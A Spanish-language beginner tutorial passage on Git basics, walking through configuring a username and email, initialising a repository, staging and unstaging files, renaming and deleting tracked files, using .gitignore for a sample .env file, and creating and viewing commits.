&lt;p&gt;En este caso creare el directorio &lt;code&gt;miGit&lt;/code&gt; usando el comando &lt;code&gt;mkdir&lt;/code&gt; y con &lt;code&gt;cd&lt;/code&gt; ingresare al directorio&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir miGit
❯ cd miGit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora procederemos a configurar algo muy importante en &lt;code&gt;Git&lt;/code&gt; que seria nuestro usuario y correo, ya que cada vez que creeemos un &lt;code&gt;commit&lt;/code&gt; se registrara la información de quien realizo el cambio. Esto es util ya que si estamos trabajando en un proyecto colaborativo, cada uno de los desarrolladores del proyecto podran saber quien realizo ese cambio y cual es su correo asociado; de igual manera si solo nosotros estamos trabajando en el proyecto podemos saber en un futuro que cambio realizamos.&lt;/p&gt;

&lt;p&gt;Para poder realizar la configuración del nombre de &lt;code&gt;usuario&lt;/code&gt; solo debemos ejecutar el siguiente comando.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config --global user.name &quot;Firtsmiracle&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;cabe mencionar que si unicamente deseamos esta configuración para un unico proyecto debemos omitir el uso de la bandera &lt;code&gt;--global&lt;/code&gt;, pero al ser nosotros dueños del repositorio es recomendable hacerlo globalmente.&lt;/p&gt;

&lt;p&gt;Si queremos ver que los cambios se realizaron correctamente usamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config user.name
Firtsmiracle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De la misma manera si queremos configurar la información del &lt;code&gt;correo&lt;/code&gt;, usamos el comando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config --global user.email &quot;firtsmiracle@hotmail.com&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;volvemos a revisar si los cambios se guardaron exitosamente con el comando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git config user.email
firtsmiracle@hotmail.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;creación-del-repositorio&quot;&gt;Creación de Repositorio &lt;a href=&quot;#creación-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez tengamos configurado nuestro nombre de &lt;code&gt;usuario&lt;/code&gt; y el &lt;code&gt;correo&lt;/code&gt;, finalmente podemos continuar con lo mas fundamental de &lt;code&gt;Git&lt;/code&gt;, que es la creación de un repositorio.&lt;/p&gt;

&lt;p&gt;Primeramente debemos estar dentro de nuestra carpeta o directorio de trabajo en nuestro caso en la carpeta &lt;code&gt;miGit&lt;/code&gt; con &lt;code&gt;pwd&lt;/code&gt; verificamos que estemos en la ruta&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ pwd
/home/fmiracle/Desktop/Prueba/Git/miGit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder crear el repositorio dentro de esa carpeta debemos ejecutar el siguente comando &lt;code&gt;git init&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git init
Inicializado repositorio Git vacío en /home/fmiracle/Desktop/Prueba/Git/miGit/.git/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Este comando nos inicializara un repositorio de &lt;code&gt;Git&lt;/code&gt; dentro de esta carpeta y con ello vamos a poder rastrear las versiones de todos los archivos que esten dentro de esta carpeta.&lt;/p&gt;

&lt;p&gt;Esto nos crea una carpeta de nombre &lt;code&gt;.git&lt;/code&gt; que se encuentra oculta como medida de seguridad, si deseamos verla podemos usar el comando &lt;code&gt;ls -la&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls -la
drwxr-xr-x root root  8 B Mon Apr 10 17:38:01 2023  .
drwxr-xr-x root root 10 B Mon Apr 10 17:37:56 2023  ..
drwxr-xr-x root root 98 B Mon Apr 10 17:38:01 2023  .git
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;areas-de-git&quot;&gt;Areas de Git &lt;a href=&quot;#areas-de-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Existen tres areas en las cuales puede estar un archivo &lt;code&gt;Git&lt;/code&gt;, donde cada una de ellas representara un estado distinto de un archivo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/areas.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;directorio-de-trabajo-working-direcotry&quot;&gt;Directorio de Trabajo - Working Directory &lt;a href=&quot;#directorio-de-trabajo-working-direcotry&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es la carpeta del proyecto que justamente va a contener los archivos y el directorio oculto &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;area-de-preparación-staging-area&quot;&gt;Area de Preparación - Staging Area &lt;a href=&quot;#area-de-preparación-staging-area&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Viene a ser una area intermedia entre el &lt;code&gt;directorio del trabajo&lt;/code&gt; y el &lt;code&gt;Repositorio&lt;/code&gt;, aqui se encuentran los archivos y cambios que seran incluidos en el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Cabe mencionar que esta area no es definitiva para agregarla al repositorio, ya que podemos evaluar y retractar los cambios que realizamos para que no se incluyan en el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Cuando ya tenemos todos los cambios listo en el area de preparación, ahora si podemos crear un &lt;code&gt;commit&lt;/code&gt; que sera el definitivo donde se encontraran los cambios que se agregaran al repositorio&lt;/p&gt;

&lt;h3 id=&quot;repositorio-.git&quot;&gt;Repositorio .git &lt;a href=&quot;#repositorio-.git&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Aqui se contienen todos los metadatos y versiones de todo nuestro proyecto, es la parte del repositorio que se copia al clonar un repositorio externo en nuestra pc, concretamente cuando hacemos &lt;code&gt;git clone https://github.com/nombre_repo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Es la parte mas importante de &lt;code&gt;Git&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;estados-de-git&quot;&gt;Estados de Git &lt;a href=&quot;#estados-de-git&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Los archivos al estar en cada una de las areas mencionadas, repre/senta un estado distinto que podemos ver a continuación:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/Estados.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;modificada-modified&quot;&gt;Modificada - Modified &lt;a href=&quot;#modificada-modified&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;La versión del archivo esta &lt;code&gt;modificada&lt;/code&gt;, si la versión contiene cambios que no son parte del repositorio y no se han añadido al &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;preradara-staged&quot;&gt;Preparada - Staged &lt;a href=&quot;#preparada-staged&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;La versión es &lt;code&gt;preparada&lt;/code&gt;, cuando contiene cambios que no son parte del repositorio, pero si fue añadida al &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;confirmada-commited&quot;&gt;Confirmada - Commited &lt;a href=&quot;#confirmada-commited&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;La versión es &lt;code&gt;confirmada&lt;/code&gt;, si ya se encuentra en el directorio &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;estado-del-repositorio&quot;&gt;Estado del Repositorio &lt;a href=&quot;#estado-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder verificar el estado de nuestro repositorio podemos hacer uso del comando &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

no hay nada para confirmar (crea/copia archivos y usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de ejecutar el comando nos muestra que estamos en la rama &lt;code&gt;main&lt;/code&gt;, que aun no hemos realizado un &lt;code&gt;commit&lt;/code&gt; y ademas vemos que tampoco hay nada pendiente para realizar un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cabe mencionar que segun la instalación nuestra rama principal puede ser &lt;code&gt;main&lt;/code&gt; o &lt;code&gt;master&lt;/code&gt; y si deseamos cambiarla debemos ejecutar el comando &lt;code&gt;git config --global init.defaultBranch main&lt;/code&gt; para establecer &lt;code&gt;main&lt;/code&gt; como la rama principal por defecton, aunque de seguir con la que tenemos por defecto podemos trabajar sin problemas igualmente, pero hay que tenerlo en cuenta&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ahora que ocurre si yo creo un archivo lo llamaremos &lt;code&gt;archivo_git.txt&lt;/code&gt; y le introduciremos un contenido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi primer repositorio
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Si volvemos a ejecutar el comando &lt;code&gt;git status&lt;/code&gt;, esta vez nos dice que tenemos archivos que no estamos haciendo seguimiento, concretamente el archivo que creamos &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	archivo_git.txt

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si queremos comenzar a hacer seguimiento del arhivo, debemos ejecutar el comando &lt;code&gt;git add&lt;/code&gt; y seguido el nombre del archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A simple vista parece no haberse ejecutado ningun cambio pero si volvemos a verificar el estado con &lt;code&gt;git status&lt;/code&gt;,  ahora si tenemos cambios que van a ser agregados al proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Cambios a ser confirmados:
  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cuando vemos que el archivo ya es parte de los cambios que se agregaran a el proximo &lt;code&gt;commit&lt;/code&gt;, quiere decir que ya es parte del &lt;code&gt;area de preparación&lt;/code&gt;, pero recordemos que en esta area aun podemos retractarnos y decir a &lt;code&gt;Git&lt;/code&gt; que no queremos agregarlos al proximo &lt;code&gt;commit&lt;/code&gt;, y esto lo hacemos como nos indica &lt;code&gt;Git&lt;/code&gt; con el comando &lt;code&gt;git rm --cached&lt;/code&gt; y seguidamente el nombre del archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git rm --cached archivo_git.txt
rm 'archivo_git.txt'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Volvemos a verificar el estado y vemos que el archivo nuevamente no esta en seguimiento.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	archivo_git.txt

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Saber esto es importante ya que en el &lt;code&gt;area de preparación&lt;/code&gt; los cambios no son definitivos, ya que podemos equivocarnos y por error incluir un archivo al &lt;code&gt;area de preparación&lt;/code&gt;podemos verificar que cambios seran agregados y si queremos removerlos del &lt;code&gt;area de preparación&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Ahora si queremos volver a colocar el archivo en el area de &lt;code&gt;preparación&lt;/code&gt;, usamos nuevamente el comando &lt;code&gt;git add&lt;/code&gt; y nuevamente vemos que hay cambios que seran agregados al proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
❯ git status
En la rama main

No hay commits todavía

Cambios a ser confirmados:
  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que faltaria ahora sera pasar el archivo del &lt;code&gt;area de preparación&lt;/code&gt; al repositorio como tal &lt;code&gt;.git&lt;/code&gt; para ello veamos a continuaciòn como creamos un &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;renombrar-archivos&quot;&gt;Renombrar Archivos del Repositorio &lt;a href=&quot;#renombrar-archivos&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Como vimos por cada acción que hagamos al archivo, al usar &lt;code&gt;git status&lt;/code&gt; nos saldra el mensaje de que hay archivos sin seguimiento y demos usar &lt;code&gt;git add&lt;/code&gt; para agregarlos. Concretamente en este caso si queremos renombar un archivo usamos el comando &lt;code&gt;mv&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Renombraremos el archivo que creamos &lt;code&gt;archivo.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 archivo.txt   archivo_git.txt
❯ mv archivo.txt archivo_renombrado.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente debemos agregar el archivo con &lt;code&gt;git add&lt;/code&gt; a el &lt;code&gt;area de preperación&lt;/code&gt;, despues de ejecutar &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	archivo_renombrado.txt

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
❯ git add archivo_renombrado.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El problema es que es mas tedioso y repetitivo estar ejecutando cada comando, por ello &lt;code&gt;Git&lt;/code&gt; nos da la opción de acortar todos estos pasos realizados solo usando un comando &lt;code&gt;git mv&lt;/code&gt; y seguido renombrar el archivo, practicamente lo mismo que ejecutamos al renombrarlo con &lt;code&gt;mv&lt;/code&gt; solo que ahora debemos anteponer la palabra &lt;code&gt;git&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;En este caso renombraremos el archivo &lt;code&gt;archivo_renombrado.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git mv archivo_renombrado.txt archivo_modificado.txt
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_modificado.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que usando el comando &lt;code&gt;git mv&lt;/code&gt; ya nos es necesario usar &lt;code&gt;git add&lt;/code&gt; ya que el archivo se agrega automaticamente al &lt;code&gt;area de preparación&lt;/code&gt;, lo que nos optimiza el proceso.&lt;/p&gt;

&lt;h3 id=&quot;eliminar-archivos-del-repositorio&quot;&gt;Eliminar archivos del Repositorio &lt;a href=&quot;#eliminar-archivos-del-repositorio&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;De la misma forma que renombramos el archivo, podemos hacer lo mismo para eliminarlo. anteponiendo la palabra &lt;code&gt;git&lt;/code&gt; y seguido el comando &lt;code&gt;rm&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para este caso vamos a eliminar el archivo que renombramos antes &lt;code&gt;archivo_modificado.txt&lt;/code&gt;, para ello como ya se encontraba en el &lt;code&gt;area de preparación&lt;/code&gt; debemos retirarla haciendo uso de los comandos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git restore --staged archivo_modificado.txt
git restore archivo_modificado.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez el arbol de trabajo este limpio, ejecutamos el comando &lt;code&gt;git rm&lt;/code&gt; y seguido el archivo que queremos eliminar. Visualizamos los cambios y vemos que nos agilizo el proceso ya que el archivo se encuentra en el &lt;code&gt;area de preparación&lt;/code&gt; y no fue necesario agregarlo ejecutando el &lt;code&gt;git add&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git rm archivo_modificado.txt
rm 'archivo_modificado.txt'
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	borrados:        archivo_modificado.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;gitignore-ignorar-archivos-y-directorios&quot;&gt;Gitignore - Ignorar archivos y directorios &lt;a href=&quot;#gitignore-ignorar-archivos-y-directorios&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos ignorar archivos, que nunca se incluyan en nuestro repositorio y que solo sean especificos para nuestra máquina como son las variables de entorno.&lt;/p&gt;

&lt;p&gt;Supongamos que estamos trabajando con una &lt;code&gt;base de datos&lt;/code&gt; que tenemos instalada localmente, en este caso queremos que este archivo no se suba al repositorio, ya que no queremos que otras personas conozcan estos datos.&lt;/p&gt;

&lt;p&gt;Para ello vamos a crearnos un archivo al que llamaremos &lt;code&gt;.env&lt;/code&gt; que tendra de contenido unas supuestas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat .env
user=firtsmiracle
password=12345
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora ejecuto &lt;code&gt;git status&lt;/code&gt; y nos aparece este archivo &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	.env

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pero yo no quiero que por error este archivo se agregue a incluir en un &lt;code&gt;commit&lt;/code&gt;, para ello debemos crear un archivo de nombre &lt;code&gt;.gitignore&lt;/code&gt; y en este archivo especificare cuales son los archivos o rutas de carpetas que quiero ignorar para que no vallan a nuestro repositorio.&lt;/p&gt;

&lt;p&gt;En este caso agregare dentro del archivo &lt;code&gt;.gitignore&lt;/code&gt; a nuestro archivo que contenia las credenciales &lt;code&gt;.env&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat .gitignore
.env
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si ahora vuelvo a ejecutar el comando &lt;code&gt;git status&lt;/code&gt; el archivo &lt;code&gt;.env&lt;/code&gt; ya no aparece, solo aparece el archivo &lt;code&gt;.gitignore&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Archivos sin seguimiento:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para incluirlo a lo que se será confirmado)
	.gitignore

no hay nada agregado al commit pero hay archivos sin seguimiento presentes (usa &quot;git add&quot; para hacerles seguimiento)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces agregamos nuestro archivo &lt;code&gt;.gitignore&lt;/code&gt; con &lt;code&gt;git add&lt;/code&gt; y verificamos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .gitignore
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: .gitignore
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De esta manera todo lo que incluyamos dentro del archivo &lt;code&gt;.gitignore&lt;/code&gt; no sera agregado por ningun motivo al repositorio.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Un pequeño tip final es que con el comando &lt;code&gt;git status -s&lt;/code&gt;, podemos ver el estado en el que se encuentra cada archivo de manera simplificada.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status -s
A  .gitignore
D archivo_modificado.txt
?? archivo_cambiado.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Donde &lt;code&gt;A&lt;/code&gt; seria agregado, &lt;code&gt;D&lt;/code&gt; borrado y cuando vemos &lt;code&gt;??&lt;/code&gt; quiere decir que el archivo aun no tiene un seguimiento.&lt;/p&gt;

&lt;h2 id=&quot;creación-de-un-commit&quot;&gt;Creación de un Commit &lt;a href=&quot;#creación-de-un-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Antes de crear nuestro primer &lt;code&gt;commit&lt;/code&gt;, debemos recordar que un &lt;code&gt;commit&lt;/code&gt; viene a ser un registro o foto del estado de nuestro proyecto en un momento especifico. Registra los cambios realizados en los archivos en comparación con la versión anterior.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/commits.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cada vez que creeemos un &lt;code&gt;commit&lt;/code&gt; debemos agregarle una descripción segun la acción o los cambios que hayamos realizado esto es muy importante para saber con detalle a traves del tiempo las modificaciones que se realizaron en el proyecto.&lt;/p&gt;

&lt;p&gt;Ahora comenzemos a crear nuestro &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Anteriormente cuando ejecutamos &lt;code&gt;git status&lt;/code&gt;, veiamos que habian cambios que estan listos para ser agregados del &lt;code&gt;area de preparación&lt;/code&gt; a al repositorio &lt;code&gt;.git&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main

No hay commits todavía

Cambios a ser confirmados:
  (usa &quot;git rm --cached &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	nuevos archivos: archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente seria agregar un &lt;code&gt;commit&lt;/code&gt;, esto lo hacemos con el comando &lt;code&gt;git commit&lt;/code&gt; y seguidamente con &lt;code&gt;-m&lt;/code&gt; agregamos una descripción.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit -m &quot;agregar mi archivo de texto&quot;
[main (commit-raíz) 0143452] agregar mi archivo de texto
 1 file changed, 1 insertion(+)
 create mode 100644 archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Se nos muestra información del &lt;code&gt;commit&lt;/code&gt;, como su identificador &lt;code&gt;0143452&lt;/code&gt;, la descripción y hubo una modificación en conjunto con una inserción que significa que se agrego una linea al archivo.&lt;/p&gt;

&lt;h2 id=&quot;estructura-del-commit&quot;&gt;Estructura del Commit &lt;a href=&quot;#estructura-del-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La estructura de un&lt;code&gt;commit&lt;/code&gt; se compone de varias partes, esto lo observamos al ejecutar el comando &lt;code&gt;git log&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos observar inicialmente una serie de numeros alfanumericos que corresponde a un identificador unico llamado &lt;code&gt;SHA&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;SHA: Scure Hash Algorith o Algoritmo de hash seguro&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;este &lt;code&gt;SHA&lt;/code&gt; identifica:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Los cambios realizados&lt;/li&gt;
  &lt;li&gt;Dónde se realizaron los cambios&lt;/li&gt;
  &lt;li&gt;Quién realizo los cambios&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Seguidamente el &lt;code&gt;commit&lt;/code&gt; contiene el nombre del &lt;code&gt;usuario&lt;/code&gt; en conjunto con el &lt;code&gt;correo&lt;/code&gt; asignado &lt;code&gt;Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;&lt;/code&gt;; tambien podemos observar la fecha de creación del &lt;code&gt;commit&lt;/code&gt; que corresponde a &lt;code&gt;Date:   Mon Apr 10 18:43:50 2023 +0000&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finalmente en la ultima parte podemos ver la descripción que agregamos al crear nuestro &lt;code&gt;commit&lt;/code&gt; -&amp;gt; &lt;code&gt;agregar mi archivo de texto&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;historial-de-commits&quot;&gt;Historial de Commits &lt;a href=&quot;#historial-de-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si queremos ver el registro de nuestros &lt;code&gt;commits&lt;/code&gt;, podemos usar el comando &lt;code&gt;git log&lt;/code&gt; el cual nos mostrara el historial de todos los &lt;code&gt;commits&lt;/code&gt; que hayamos creado.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
Date:   Mon Apr 10 18:43:50 2023 +0000

    agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como vimos anteriormente vemos el &lt;code&gt;commit&lt;/code&gt; con su estructura; cabe resaltar que si creamos mas &lt;code&gt;commits&lt;/code&gt; con este comandos los veremos todos.&lt;/p&gt;

&lt;h2 id=&quot;creación-alterna-de-commits&quot;&gt;Creación Alterna de Commits &lt;a href=&quot;#creación-alterna-de-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Supongamos que editamos el archivo que tenemos &lt;code&gt;archivo_git.txt&lt;/code&gt; y le cambiamos el contenido&lt;/p&gt;

&lt;p&gt;El cual cambiaremos de este contenido:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi primer repositorio
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;a este nuevo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ejecutamos &lt;code&gt;git status&lt;/code&gt; vemos que tenemos un archivo en estado &lt;code&gt;modificado&lt;/code&gt; y que hay cambios no rastreados para el proximo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama main
Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt

sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para agregar los cambios entonces debemos ejecutar &lt;code&gt;git add&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add archivo_git.txt
❯ git status
En la rama main
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que el archivo esta lista para agregarse al &lt;code&gt;commit&lt;/code&gt;, procerederemos a crearlo&lt;/p&gt;

&lt;p&gt;Esta vez ejecutaremos unicamente el comando &lt;code&gt;git commit&lt;/code&gt; sin ningun parametro adiocional, lo que hara que se nos abra el editor de texto donde podremos insertar la descripción ddel &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

